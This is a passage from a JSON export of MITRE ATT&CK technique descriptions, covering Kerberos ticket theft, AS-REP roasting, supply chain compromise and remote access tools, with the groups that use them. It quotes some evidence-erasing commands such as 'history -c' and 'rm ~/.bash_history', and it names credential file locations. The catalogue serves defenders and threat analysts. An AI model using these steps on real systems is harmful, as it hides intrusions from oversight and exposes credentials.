typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.^[[11]](https://dotnet.microsoft.com/learn/dotnet/what-is-dotnet-framework)^^[[12]](https://developer.apple.com/documentation/coreservices)^^[[13]](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/OSX_Technology_Overview/CocoaApplicationLayer/CocoaApplicationLayer.html#//apple_ref/doc/uid/TP40001067-CH274-SW1)^^[[14]](https://developer.apple.com/documentation/foundation)^\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.^[[15]](https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls)^ Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).","platforms":["Windows","macOS","Linux"],"tactics":["Execution"],"campaigns":["Operation Dream Job","Operation Honeybee","Operation Wocao","Operation Sharpshooter"],"groups":["Higaisa","Lazarus Group","Gorgon Group","Turla","Chimera","BlackTech","SideCopy","Tropic Trooper","menuPass","APT37","Gamaredon Group","APT38","TA505","Silence","Sharpshooter","Operation Wocao"]},"T1070.007":{"id":"T1070.007","name":"Clear Network Connection History and Configurations","description":"Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under ^[[1]](https://docs.microsoft.com/troubleshoot/windows-server/remote/remove-entries-from-remote-desktop-connection-computer)^:\n\n* `HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default`\n* `HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers`\n\nWindows may also store information about recent RDP connections in files such as `C:\\Users\\\\%username%\\Documents\\Default.rdp` and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`.^[[2]](https://www.osdfcon.org/presentations/2020/Brian-Moran_Putting-Together-the-RDPieces.pdf)^ Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).^[[3]](https://discussions.apple.com/thread/3991574)^^[[4]](https://www.freedesktop.org/software/systemd/man/systemd-journald.service.html)^^[[5]](https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins)^\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.","platforms":["Linux","macOS","Windows","Network"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Volt Typhoon"]},"T1558.004":{"id":"T1558.004","name":"AS-REP Roasting","description":"Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.^[[1]](http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)^ \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.^[[2]](https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx)^\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. ^[[1]](http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)^^[[3]](https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/)^ \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. ^[[1]](http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)^^[[3]](https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/)^\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).^[[4]](https://redsiege.com/kerberoast-slides)^","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":[],"groups":[]},"T1584.003":{"id":"T1584.003","name":"Virtual Private Server","description":"Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.^[[1]](https://media.defense.gov/2019/Oct/18/2002197242/-1/-1/0/NSA_CSA_Turla_20191021%20ver%204%20-%20nsa.gov.pdf)^\n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["Turla"]},"T1600.001":{"id":"T1600.001","name":"Reduce Key Space","description":"Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.^[[1]](https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices)^\n\nAdversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.\n\nAdversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device. ^[[2]](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)^","platforms":["Network"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1070.003":{"id":"T1070.003","name":"Clear Command History","description":"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable `HISTFILE`. When a user logs off a system, this information is flushed to a file in the user's home directory called `~/.bash_history`. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (`history -c`) or deleting the bash history file `rm ~/.bash_history`.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (`clear logging` and/or `clear history`).^[[1]](https://www.us-cert.gov/ncas/alerts/TA18-106A)^\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the `PSReadLine` module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe `PSReadLine` command history tracks the commands used in all PowerShell sessions and writes them to a file (`$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt` by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.^[[2]](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_history?view=powershell-7)^\n\nAdversaries may run the PowerShell command `Clear-History` to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the `ConsoleHost_history.txt` file. Adversaries may also delete the `ConsoleHost_history.txt` file or edit its contents to hide PowerShell commands they have run.^[[3]](https://community.sophos.com/products/intercept/early-access-program/f/live-discover-response-queries/121529/live-discover---powershell-command-audit)^^[[4]](https://community.sophos.com/products/malware/b/blog/posts/powershell-command-history-forensics)^","platforms":["Linux","macOS","Windows","Network"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["TeamTNT","menuPass","Magic Hound","Lazarus Group","APT41"]},"T1202":{"id":"T1202","name":"Indirect Command Execution","description":"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. ^[[1]](https://twitter.com/vector_sec/status/896049052642533376)^ ^[[2]](https://twitter.com/Evi1cg/status/935027922397573120)^\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Lazarus Group"]},"T1091":{"id":"T1091","name":"Replication Through Removable Media","description":"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\n\nMobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.^[[1]](https://www.computerworld.com/article/2486903/windows-malware-tries-to-infect-android-devices-connected-to-pcs.html)^^[[2]](https://techcrunch.com/2019/08/12/iphone-charging-cable-hack-computer-def-con/)^ For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).","platforms":["Windows"],"tactics":["Lateral Movement","Initial Access"],"campaigns":[],"groups":["LuminousMoth","Aoqin Dragon","Darkhotel","Mustang Panda","FIN7","APT28","Tropic Trooper"]},"T1005":{"id":"T1005","name":"Data from Local System","description":"Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.^[[1]](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/show_protocols_through_showmon.html#wp2760878733)^ Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n","platforms":["Linux","macOS","Windows","Network"],"tactics":["Collection"],"campaigns":["Night Dragon","Operation Wocao","C0015","Operation Dream Job","SolarWinds Compromise","C0017","Operation Honeybee","Frankenstein","CostaRicto","Operation CuckooBees","C0026"],"groups":["Kimsuky","BRONZE BUTLER","LAPSUS$","APT39","HAFNIUM","Axiom","Windigo","Fox Kitten","Andariel","APT1","GALLIUM","APT29","Lazarus Group","Gamaredon Group","FIN6","Turla","APT41","LuminousMoth","APT37","Dragonfly","CURIUM","APT28","Inception","Ke3chang","Patchwork","APT3","Threat Group-3390","FIN7","Stealth Falcon","APT38","Volt Typhoon","menuPass","Wizard Spider","Magic Hound","Dark Caracal","Sandworm Team","FIN13","UNC2452","Frankenstein","Operation Wocao","Dust Storm","Honeybee","Dragonfly 2.0"]},"T1140":{"id":"T1140","name":"Deobfuscate/Decode Files or Information","description":"Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.^[[1]](https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/)^ Another example is using the Windows `copy /b` command to reassemble binary fragments into a malicious payload.^[[2]](https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/)^\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. ^[[3]](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/)^","platforms":["Windows","Linux","macOS"],"tactics":["Defense Evasion"],"campaigns":["Operation Spalax","C0017","SolarWinds Compromise","C0021","Frankenstein","Operation Dust Storm","Operation Honeybee"],"groups":["BRONZE BUTLER","Turla","APT39","WIRTE","Gorgon Group","Kimsuky","Ke3chang","Molerats","Darkhotel","Earth Lusca","ZIRCONIUM","MuddyWater","OilRig","Gamaredon Group","TA505","Threat Group-3390","APT28","TeamTNT","menuPass","Lazarus Group","Leviathan","Rocke","Tropic Trooper","FIN13","Sandworm Team","APT19","Higaisa","UNC2452","APT29","Frankenstein","Honeybee","APT34"]},"T1137.005":{"id":"T1137.005","name":"Outlook Rules","description":"Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.^[[1]](https://silentbreaksecurity.com/malicious-outlook-rules/)^\n\nOnce malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.^[[1]](https://silentbreaksecurity.com/malicious-outlook-rules/)^","platforms":["Windows","Office 365"],"tactics":["Persistence"],"campaigns":[],"groups":[]},"T1562":{"id":"T1562","name":"Impair Defenses","description":"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out of a computer or stopping it from being shut down. These restrictions can further enable malicious operations as well as the continued propagation of incidents.^[[1]](https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/)^\n\nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.","platforms":["Windows","Office 365","IaaS","Linux","macOS","Containers","Network"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Magic Hound"]},"T1586.003":{"id":"T1586.003","name":"Cloud Accounts","description":"Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.^[[1]](https://awakesecurity.com/blog/threat-hunting-series-detecting-command-control-in-the-cloud/)^\n\nA variety of methods exist for compromising cloud accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003) attacks, or attempting to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.^[[2]](https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/)^ Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) between service providers and their customers.^[[2]](https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["APT29"]},"T1586.002":{"id":"T1586.002","name":"Email Accounts","description":"Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).\n\nA variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.^[[1]](https://arstechnica.com/tech-policy/2011/02/anonymous-speaks-the-inside-story-of-the-hbgary-hack/)^^[[2]](https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/)^ Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or [Phishing](https://attack.mitre.org/techniques/T1566) emails may evade reputation-based email filtering rules.\n\nAdversaries can use a compromised email account to hijack existing email threads with targets of interest.","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["APT28","Magic Hound","HEXANE","Kimsuky","LAPSUS$","IndigoZebra","APT29","Leviathan"]},"T1608.001":{"id":"T1608.001","name":"Upload Malware","description":"Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.^[[1]](https://www.volexity.com/blog/2020/11/06/oceanlotus-extending-cyber-espionage-operations-through-fake-websites/)^^[[2]](https://blog.talosintelligence.com/ipfs-abuse/)^\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["Operation Dream Job","Night Dragon","C0011","Operation Spalax","C0010","Operation Sharpshooter","C0021"],"groups":["TA2541","Earth Lusca","Mustang Panda","LuminousMoth","Kimsuky","TeamTNT","LazyScripter","Gamaredon Group","Threat Group-3390","SideCopy","TA505","BITTER","APT32","HEXANE","FIN7","EXOTIC LILY","Lazarus Group"]},"T1195":{"id":"T1195","name":"Supply Chain Compromise","description":"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)^[[1]](https://www-01.ibm.com/support/docview.wss?uid=ssg1S1010146&myns=s028&mynp=OCSTHGUJ&mynp=OCSTLM5A&mynp=OCSTLM6B&mynp=OCHW206&mync=E&cm_sp=s028-_-OCSTHGUJ-OCSTLM5A-OCSTLM6B-OCHW206-_-E)^^[[2]](https://www.se.com/ww/en/download/document/SESN-2018-236-01/)^ \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.^[[3]](https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities)^^[[4]](https://cloudblogs.microsoft.com/microsoftsecure/2018/03/07/behavior-monitoring-combined-with-machine-learning-spoils-a-massive-dofoil-coin-mining-campaign/)^^[[5]](https://www.commandfive.com/papers/C5_APT_SKHack.pdf)^ Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.^[[6]](https://web.archive.org/web/20190717233006/http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-elderwood-project.pdf)^^[[3]](https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities)^^[[5]](https://www.commandfive.com/papers/C5_APT_SKHack.pdf)^ Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.^[[7]](https://www.trendmicro.com/vinfo/dk/security/news/cybercrime-and-digital-threats/hacker-infects-node-js-package-to-steal-from-bitcoin-wallets)^","platforms":["Linux","Windows","macOS"],"tactics":["Initial Access"],"campaigns":[],"groups":["Elderwood"]},"T1190":{"id":"T1190","name":"Exploit Public-Facing Application","description":"Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.^[[1]](https://nvd.nist.gov/vuln/detail/CVE-2016-6662)^^[[2]](https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/)^^[[3]](https://us-cert.cisa.gov/ncas/alerts/TA18-106A)^^[[4]](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)^^[[5]](https://nvd.nist.gov/vuln/detail/CVE-2014-7169)^ Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211). \n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.^[[6]](https://www.mandiant.com/resources/blog/fortinet-malware-ecosystem)^^[[7]](https://www.wired.com/story/russia-ukraine-cyberattacks-mandiant/)^\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.^[[8]](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)^^[[9]](https://cwe.mitre.org/top25/index.html)^","platforms":["Windows","IaaS","Network","Linux","macOS","Containers"],"tactics":["Initial Access"],"campaigns":["C0027","C0018","Operation Wocao","Night Dragon","C0017","Operation CuckooBees","SolarWinds Compromise"],"groups":["Rocke","Threat Group-3390","Volt Typhoon","APT28","Kimsuky","BackdoorDiplomacy","GOLD SOUTHFIELD","FIN13","BlackTech","Magic Hound","Fox Kitten","Ke3chang","menuPass","Blue Mockingbird","GALLIUM","Earth Lusca","APT29","Volatile Cedar","Moses Staff","Dragonfly","Axiom","APT41","HAFNIUM","MuddyWater","APT39","UNC2452","Operation Wocao","Night Dragon"]},"T1558":{"id":"T1558","name":"Steal or Forge Kerberos Tickets","description":"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).^[[1]](https://adsecurity.org/?p=227)^ Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in `klist` utility can be used to list and analyze cached Kerberos tickets.^[[2]](https://docs.microsoft.com/windows-server/administration/windows-commands/klist)^\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.^[[3]](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html)^ On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in `/var/lib/sss/secrets/secrets.ldb` as well as the corresponding key located in `/var/lib/sss/secrets/.secrets.mkey`. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.^[[4]](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)^^[[5]](https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf)^^[[6]](https://github.com/gentilkiwi/kekeo)^\n\n\nKerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the `/etc/krb5.conf` configuration file and the `KRB5CCNAME` environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using `kinit`, `klist`, `ktutil`, and `kcc` built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.^[[7]](https://posts.specterops.io/when-kirbi-walks-the-bifrost-4c727807744f)^^[[8]](http://web.mit.edu/macdev/KfM/Common/Documentation/preferences.html)^\n","platforms":["Windows","Linux","macOS"],"tactics":["Credential Access"],"campaigns":[],"groups":[]},"T1555":{"id":"T1555","name":"Credentials from Password Stores","description":"Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.","platforms":["Linux","macOS","Windows","IaaS"],"tactics":["Credential Access"],"campaigns":["SolarWinds Compromise"],"groups":["HEXANE","Volt Typhoon","Leafminer","Stealth Falcon","APT39","Evilnum","APT33","MuddyWater","OilRig","FIN6","APT29","UNC2452"]},"T1567":{"id":"T1567","name":"Exfiltration Over Web Service","description":"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\n\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.","platforms":["Linux","macOS","Windows","Office 365","SaaS","Google Workspace"],"tactics":["Exfiltration"],"campaigns":["C0017"],"groups":["Magic Hound","APT28"]},"T1219":{"id":"T1219","name":"Remote Access Software","description":"An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.^[[1]](https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf)^^[[2]](https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf)^^[[3]](https://blog.crysys.hu/2013/03/teamspy/)^\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\n \nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)).","platforms":["Linux","Windows","macOS"],"tactics":["Command and Control"],"campaigns":["C0018","C0027","C0015","Night Dragon"],"groups":["TeamTNT","Evilnum","Mustang Panda","FIN7","Kimsuky","Thrip","GOLD SOUTHFIELD","RTM","DarkVishnya","Sandworm Team","Carbanak","MuddyWater","Cobalt Group","Night 